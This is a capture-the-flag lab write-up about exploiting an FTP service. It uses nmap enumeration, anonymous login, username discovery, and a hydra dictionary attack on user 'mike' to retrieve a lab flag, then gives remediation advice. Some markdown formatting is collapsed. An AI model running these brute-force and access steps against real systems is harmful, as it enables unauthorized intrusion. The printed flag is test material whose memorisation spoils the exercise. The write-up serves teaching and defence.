## 🎯 Objective
Identify and exploit misconfigurations in an FTP service to gain unauthorized access and retrieve sensitive information (Flag).

---

## 🔍 Phase 1: Enumeration

### 1.1 Network Scanning
Initial discovery was performed using `nmap` to identify open ports and service versions.

```bash
# General SYN scan to find open ports
nmap -sS -Pn <TARGET_IP>

# Targeted service version detection for FTP
nmap -sV -p 21 <TARGET_IP>
Results:Port: 21/tcpService: FTPState: Open1.2 Anonymous Access CheckTested for improper authentication settings (Anonymous login).Bashftp <TARGET_IP>
# Name: anonymous
# Password: <blank>
[!IMPORTANT]Finding: Anonymous login is ENABLED.Data Exfiltrated: PUBLIC_NOTICE.txtInformation Disclosure:The file contained the message: "Backups will be made to my account. Cheers, Mike."This revealed a valid system username: mike.🧨 Phase 2: Exploitation2.1 Credential Brute-ForceUsing the identified username mike, I performed a dictionary attack against the FTP service using the rockyou.txt wordlist.Bashhydra -l mike -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ftp
Success:Valid Credentials Found: mike : password2.2 Authenticated Access & Flag RetrievalLogged in with the cracked credentials to retrieve the final flag.Bashftp <TARGET_IP>
# Logged in as 'mike'

ftp> ls -a
ftp> get ftp.txt
ftp> exit
Capture the Flag:Bashcat ftp.txt
# Flag: THM{y0u_g0t_th3_ftp_fl4g}
🛡️ Vulnerability Analysis & RemediationRisk LevelIssueDescription🔴 CriticalAnonymous AccessAllowed unauthorized users to view and download files.🟠 HighInfo DisclosurePublic files revealed internal system usernames.🟠 HighWeak PasswordUser 'mike' used a common password, vulnerable to brute-force.🟡 MediumNo Rate LimitingNo protection against rapid automated authentication attempts.RecommendationsDisable Anonymous Login: Update the FTP configuration (e.g., vsftpd.conf) to anonymous_enable=NO.Strong Password Policy: Enforce a policy requiring complex, non-dictionary passwords for all users.Audit File System: Ensure no sensitive information is stored in directories accessible by public-facing services.Use SFTP/FTPS: Encrypt data and credentials in transit to prevent sniffing.⚠️ DisclaimerThis activity was performed in a controlled lab environment for educational purposes.
